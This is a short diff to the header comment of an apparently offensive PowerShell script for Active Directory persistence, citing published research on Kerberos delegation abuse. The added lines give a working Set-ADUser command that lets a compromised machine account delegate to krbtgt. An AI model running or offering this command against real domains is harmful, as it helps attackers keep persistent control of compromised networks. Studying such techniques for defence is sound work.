@@ -12,6 +12,10 @@
 # allowing incoming trust to the previously compromised Machine object, as described 
 # by Elad Shamir in his: https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#unconstrained-domain-persistence
 #
+# It does the same as the following commands:
+#	PS> Import-Module ActiveDirectory
+#	PS> Set-ADUser krbtgt -PrincipalAllowedToDelegateToAccount COMPROMISED$
+#
 # This script requires PowerView to be loaded first.
 #
 # This is basically rewritten script from Harmj0y's blog post here:
